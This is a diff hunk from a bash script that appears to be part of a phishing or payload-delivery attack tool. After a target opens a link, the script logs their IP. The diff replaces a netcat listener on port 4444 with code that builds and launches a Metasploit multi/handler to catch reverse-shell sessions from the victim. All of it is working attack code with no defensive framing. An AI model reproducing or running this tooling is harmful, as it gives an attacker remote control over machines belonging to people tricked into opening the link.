@@ -261,16 +261,29 @@ while [ true ]; do
 if [[ -e "ip.txt" ]]; then
 printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
 catch_ip
-
-default_start_listener="Y"
-printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Start Listener? \e[0m\e[1;77m[Y/n]\e[0m\e[1;33m: \e[0m'
-read start_listener
-start_listener="${start_listener:-${default_start_listener}}"
-if [[ $start_listener == "Y" || $start_listener == "y" || $start_listener == "Yes" || $start_listener == "yes" ]]; then
-printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Listening connection, port 4444:\e[0m\n"
-nc -lvp 4444
-
+#
+default_listr="Y"
+read -p $'\n\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Start Metasploit Listener? \e[0m\e[1;77m[Y/n]\e[0m\e[1;33m: \e[0m' listr
+listr="${listr:-${default_listr}}"
+if [[ $listr == Y || $listr == y || $listr == Yes || $listr == yes ]]; then
+printf "use exploit/multi/handler\n" > handler.rc
+printf "set payload %s\n" $payload_msf >> handler.rc
+if [[ $forward == true ]];then
+printf "set LHOST 127.0.0.1\n" >> handler.rc
+else
+printf "set LHOST %s\n" $server_tcp >> handler.rc
 fi
+
+printf "set LPORT %s\n" $server_port >> handler.rc
+#printf "set ExitOnSession false\n" >> handler.rc
+#printf "exploit -j -z\n" >> handler.rc
+printf "exploit\n" >> handler.rc
+msfconsole -r handler.rc
+rm -rf handler.rc
+fi
+
+
+#
 fi
 done
 sleep 0.5
